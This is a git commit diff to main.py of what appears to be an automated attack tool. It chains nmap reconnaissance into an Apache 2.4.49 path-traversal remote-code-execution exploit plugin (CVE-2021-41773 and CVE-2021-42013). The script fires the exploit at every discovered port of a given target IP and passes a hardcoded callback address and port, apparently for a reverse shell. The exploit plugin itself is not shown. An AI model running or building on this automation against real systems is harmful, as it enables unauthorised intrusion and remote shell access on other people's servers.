8dd1917e04d48712d6fc69de39173e3d43180522
Steels03 <steels.github@gmail.com>
2022-09-11 11:08:08 +0200

    Initial access automation in main

--- main.py
+++ main.py
@@ -1,9 +1,16 @@
 import argparse
 import recon
+import plugins.initial_access.plugin_initial_access_apache2_4_49_RCE as plugin_initial_access_apache2_4_49_RCE
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument('-t', '--target_ip', type=str, help='ip to target', required=True)
     args = parser.parse_args()
-    recon.nmap_scan(args.target_ip)
+    res_recon = recon.nmap_scan(args.target_ip)
+    for i in res_recon:
+        try:
+            print('[+] Attempting to gain access with CVE-2021-41773 or CVE-2021-42013...')
+            plugin_initial_access_apache2_4_49_RCE.exploit(args.target_ip, i['port'], '172.19.45.72', 4321)
+        except Exception as e:
+            print(e)
